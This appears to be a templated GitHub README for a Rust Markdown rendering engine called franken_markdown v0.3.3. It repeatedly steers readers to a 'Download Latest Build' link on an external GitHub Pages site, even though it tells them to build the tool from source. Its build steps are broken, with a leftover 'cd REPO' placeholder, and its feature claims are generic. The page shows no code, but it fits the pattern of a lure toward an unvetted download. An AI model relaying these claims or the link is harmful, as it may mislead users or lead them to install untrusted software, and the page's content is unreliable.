# franken_markdown v0.3.3 - Markdown Engine 2026

> **Transform Markdown into HTML, PDF, or WebAssembly targets with franken_markdown v0.3.3, built in Rust for strictly reproducible output.**

[![Platform](https://img.shields.io/badge/Platform-Rust-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v0.3.3-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/nilsb1961/franken-markdown-core-v033?style=flat-square)](https://github.com/nilsb1961/franken-markdown-core-v033)

---

<p align="center">
  <a href="https://nilsb1961.github.io/franken-markdown-core-v033/">
    <img src="https://img.shields.io/badge/Download-franken_markdown%20Latest-brightgreen?style=for-the-badge" alt="Download franken_markdown">
  </a>
</p>

> **[Download Latest Build - franken_markdown v0.3.3](https://nilsb1961.github.io/franken-markdown-core-v033/)**

---

[Download Latest Build](https://nilsb1961.github.io/franken-markdown-core-v033/)

---

## What is franken_markdown?

franken_markdown provides a Rust-driven environment for converting plain text documents into fully realized HTML pages or stream-lined PDF files. Designed to bridge the gap between application dependencies, command-line operations, and browser-side scripting, this engine offers a unified parsing pipeline across modern software targets.

Whether building static sites, embedding rendering pipelines inside larger Rust crates, or publishing documentation artifacts, franken_markdown guarantees high efficiency and consistent, zero-drift output. It ships with built-in styling for code blocks, complex tables, and inline visual diagrams.

---

## Core Capabilities

- Written ground-up in standard Rust without extra legacy dependencies
- Generates fully self-contained HTML pages ready for distribution
- Produces lightweight, structured PDF documents
- Features a streamlined, zero-dependency executable (`fmd`)
- Ready for native browser execution via WebAssembly (WASM) targets
- Native syntax highlighting for technical code blocks
- Integrated parsing for standard tables and visual diagrams
- Guarantee of byte-identical output across repeated rendering passes

---

## Getting Started

To compile the `fmd` executable from source code, clone the main repository and build with Cargo:

```bash
git clone https://github.com/nilsb1961/franken-markdown-core-v033.git
cd REPO
cargo build --release
```

Once compilation completes, the `fmd` executable will be placed in your release binaries folder for CLI use or API binding within your custom projects.

---

## Basic Usage

Run the `fmd` command line executable to transform documents into HTML or PDF, or import the engine directly into your Rust crate.

Command line execution:

```bash
fmd input.md -o output.html
fmd input.md -o output.pdf
```

For web-frontends and WebAssembly apps, compile the project for WASM targets and feed source strings directly to the exported renderer. The core engine remains identical regardless of target architecture.

---

## Project Configuration

Control the parsing parameters via CLI arguments or crate runtime options depending on your setup.

Sample config block:

```toml
[render]
format = "html"
highlight = true
deterministic = true
```

Command line users can automate execution options using environment variables, wrapper scripts, or shell aliases. Developers integrating the Rust library can pass configuration structures directly to the public API.

---

## System Requirements

- An operational Rust toolchain for native compilation
- Supported system architecture for native binaries or WASM targets
- Local storage for build caches and output document assets
- Target document viewers (browsers, PDF tools) suitable for your generated outputs

---

## Frequently Asked Questions

**How do I install newer releases?**  
Pull the newest source code from the main repository branch or fetch updated tags directly.

**Where are rendering parameters configured?**  
Options are passed via terminal flags, build-time configs, or API configuration structures.

**Why does my output look slightly different across targets?**  
Review active feature flags and target parameters. While output is strictly deterministic, layout configurations vary between HTML and PDF renders.

**Can I run this engine client-side on web pages?**  
Yes, WebAssembly targets are natively supported.

**Is this project restricted to command-line usage?**  
No. It operates both as a standalone library and as a binary named `fmd`.

---

## Software License

Distributed under the terms of the GNU GPL v3.0 license. Read [LICENSE](LICENSE) for full details.
